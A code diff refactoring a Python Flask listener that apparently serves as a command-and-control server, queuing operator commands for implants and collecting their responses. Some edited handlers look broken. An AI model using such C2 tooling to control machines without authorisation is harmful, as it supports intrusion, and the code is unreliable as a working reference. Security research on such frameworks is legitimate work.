@@ -14,7 +14,7 @@ import requests
 class FlaskListener():
     """控制端表"""
     
-    c2_server = "http://127.0.0.1:5000"
+    c2_server = "http://127.0.0.1:8080"
     lock = mp.Lock()
     implant_lock = mp.Lock()
     TASKS = []
@@ -24,26 +24,21 @@ class FlaskListener():
     app = Flask(__name__)
     encryptionkey = None
     
+    def __init__(self):
+        self.ip = "127.0.0.1"
+        self.port = "8080"
+        self.flaskname = "".join(random.choice(string.ascii_letters) for i in range(6))
     
-    def __init__(self, name, port, ip):
-        #identifying itself
-        self.tablename = 'clients'
-        self.name = name
-        self.port = port
-        self.ipaddress = ip
-        self.createfolders()
-        self.encryptionkey()
-
 
     @app.route("/tasks", methods=["GET"])
-    def download_tasks():
+    def download_tasks(self):
         global TASKS
-        lock.acquire()
+        self.lock.acquire()
         try:
             batch = "\n".join(TASKS[:5])
             TASKS = TASKS[5:]
         finally:
-            lock.release()
+            self.lock.release()
         return batch 
 
     @app.route("/response", methods=["POST"])
@@ -56,14 +51,14 @@ class FlaskListener():
         return jsonify(TASKS)
 
     @app.route("/secret", methods=["POST"])
-    def add_request():
+    def add_request(self):
         r = request.json
-        lock.acquire()
+        self.lock.acquire()
         try:
             for cmd in r:
                 TASKS.append(cmd)
         finally:
-            lock.release()
+            self.lock.release()
         print("Queued up ", r)
         return "True"
 
@@ -104,6 +99,9 @@ class FlaskListener():
         self.server = None
         self.thread = None
         self.isRunning = False
+        
+    def getapp(self):
+        return self.app
         
         
         
